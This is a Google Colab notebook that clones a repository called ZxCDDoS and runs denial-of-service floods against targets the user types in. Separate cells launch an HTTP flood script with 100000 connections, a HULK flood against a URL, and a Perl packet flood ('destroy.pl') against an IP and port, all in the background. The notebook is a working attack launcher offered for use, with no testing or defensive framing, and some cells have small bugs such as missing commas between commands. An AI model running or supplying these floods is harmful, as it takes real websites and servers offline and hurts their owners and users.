{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNz6kIpG+b3UdKmXDK/58H2",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/nalayakofficial/ZxCDDoS/blob/main/colab.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "k6eqsjp9Un1a"
      },
      "outputs": [],
      "source": [
        "\n",
        "import subprocess\n",
        "\n",
        "commands = [\n",
        "    \"apt update\",\n",
        "    \"git clone https://github.com/nalayakofficial/ZxCDDoS\",\n",
        "    \"pip install -r ZxCDDoS/requirements.txt\",\n",
        "    \"apt install golang\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True)"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "import subprocess\n",
        "\n",
        "url = input(\"Enter Url : \")\n",
        "time = input(\"Enter Time : \")\n",
        "commands = [\n",
        "    \"cd ZxCDDoS\",\n",
        "    f'go run httpflood.go {url} 100000 get {time} nil &'\n",
        "    \"echo Started\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True)"
      ],
      "metadata": {
        "id": "59VMC_UfWeIV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "import subprocess\n",
        "\n",
        "url = input(\"Enter Url : \")\n",
        "commands = [\n",
        "    \"cd ZxCDDoS\",\n",
        "    f'go run Hulk.go -site {url} -data GET &'\n",
        "    \"echo Started\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True)"
      ],
      "metadata": {
        "id": "jzn6iRTUZJ72"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "import subprocess\n",
        "\n",
        "ip = input(\"Enter ip : \")\n",
        "port = input(\"Enter Port : \")\n",
        "commands = [\n",
        "    \"cd ZxCDDoS\",\n",
        "    f'perl destroy.pl {ip} {port} 65500 600 &'\n",
        "    \"echo Started\",\n",
        "]\n",
        "\n",
        "for command in commands:\n",
        "    subprocess.call(command, shell=True)"
      ],
      "metadata": {
        "id": "Xz_9fELhZfc8"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}